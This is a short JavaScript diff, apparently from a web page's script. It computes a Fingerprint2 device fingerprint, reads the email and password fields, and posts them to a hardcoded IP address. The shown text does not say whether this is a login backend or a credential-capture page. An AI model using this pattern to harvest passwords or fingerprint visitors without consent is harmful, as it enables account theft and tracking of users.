@@ -7,7 +7,7 @@ function getCanvasHash() {
 
     new Fingerprint2().get(function(result, components){
 
-        let allRe
+        
         console.log(result); //a hash, representing your device fingerprint
         console.log(components); // an array of FP components
     });
@@ -16,10 +16,18 @@ function getCanvasHash() {
 
 function main()
 {
-    var email= returnEmail();
-    var pass= returnPass();
-    var url="http://10.99.155.2:4000/?email=" + email + "&password=" + pass;
+    var e= returnEmail();
+    var p= returnPass();
+    var url="http://10.99.155.2:4000/";
     console.log(url);
+    $.post(url, {
+            email:e,
+            password:p
+        },
+        function (data) {
+           console.log(data);
+        });
+
 
     fetch(url).then(function(response) {
         console.log('Status:', response.status)
@@ -30,6 +38,9 @@ function main()
             console.log('FETCH Parsing Error', err)
         });
     });
+
+
+
 }
 
 function returnEmail(){
@@ -39,3 +50,4 @@ function returnEmail(){
 function returnPass(){
     return document.getElementById('pwd').value;
 }
+
